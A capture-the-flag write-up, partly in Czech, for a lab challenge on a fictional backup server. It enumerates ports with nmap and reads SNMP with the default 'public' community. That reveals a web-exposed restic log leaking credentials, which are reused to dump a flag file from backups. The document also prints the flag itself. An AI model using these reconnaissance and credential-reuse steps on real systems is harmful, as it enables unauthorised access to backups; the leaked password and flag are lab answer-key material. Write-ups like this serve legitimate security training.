# Admin Johnson (3)

## Zadání

Hi, TCC-CSIRT analyst,

admin Johnson began testing backup procedures on server `johnson-backup.cypherfix.tcc`, but left the process incomplete due to other interesting tasks. Your task is to determine whether the current state is exploitable.

See you in the next incident!

## Nápovědy (Hints)

1. Admin Johnson is not strong on maintaining password hygiene.

## Řešení

Začneme skenováním otevřených portů

`nmap johnson-backup.cypherfix.tcc`

```text
PORT    STATE SERVICE
80/tcp  open  http
199/tcp open  smux
```

Na portu 80 to vypadá, že běží Apache server ve výchozím nastavení bez nahraných webových stránek.
Port 199 slouží pro protokol SMUX (SNMP Unix Multiplexer).

Zkusíme vyčíst SNMP údaje s výchozím community `public`.

`snmpwalk -v1 -c public johnson-backup.cypherfix.tcc`

```text
...
iso.3.6.1.2.1.25.4.2.1.5.1 = STRING: "/usr/bin/supervisord"
iso.3.6.1.2.1.25.4.2.1.5.7 = STRING: "/usr/sbin/apache2ctl -D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.8 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.9 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.14 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.18 = STRING: "-c /etc/scripts/restic.sh >> /var/www/html/1790c4c2883ad30be0222a3a93004e66/restic.err.log 2>&1"
iso.3.6.1.2.1.25.4.2.1.5.20 = STRING: "/etc/scripts/restic.sh"
iso.3.6.1.2.1.25.4.2.1.5.28 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.29 = STRING: "-D FOREGROUND"
iso.3.6.1.2.1.25.4.2.1.5.30 = STRING: "-D FOREGROUND"
...
```

Zkusíme web stránku <http://johnson-backup.cypherfix.tcc/1790c4c2883ad30be0222a3a93004e66/restic.err.log>.

```text
restic -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test check
using temporary cache in /tmp/restic-check-cache-3629819862
create exclusive lock for repository
Save(<lock/340d752ce5>) returned error, retrying after 552.330144ms: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 1.080381816s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 1.31013006s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 1.582392691s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 2.340488664s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 4.506218855s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 3.221479586s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 5.608623477s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 7.649837917s: server response unexpected: 500 Internal Server Error (500)
Save(<lock/340d752ce5>) returned error, retrying after 15.394871241s: server response unexpected: 500 Internal Server Error (500)
server response unexpected: 500 Internal Server Error (500)
github.com/restic/restic/internal/backend/rest.(*Backend).Save
    github.com/restic/restic/internal/backend/rest/rest.go:167
github.com/restic/restic/internal/backend.(*RetryBackend).Save.func1
    github.com/restic/restic/internal/backend/backend_retry.go:66
...
```

Z logu lze vyčíst, že se jedná o zálohování programem `restic` včetně přihlašovacího jména `johnson` a hesla `KGDkjgsdsdg883hhd`.

Vyčteme seznam zálohovaných souborů a jako heslo k repozitáři použijeme `KGDkjgsdsdg883hhd`.

`restic --no-lock -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test ls latest`

```text
/etc
/etc/secret
/etc/secret/flag
```

A zobrazíme obsah souboru `/etc/secret/flag`, který ukrývá hledaný FLAG.

`restic --no-lock -r rest:http://johnson:KGDkjgsdsdg883hhd@restic-server.cypherfix.tcc:8000/test dump latest /etc/secret/flag`

## Flag

`FLAG{OItn-zKZW-cht7-RNH4}`
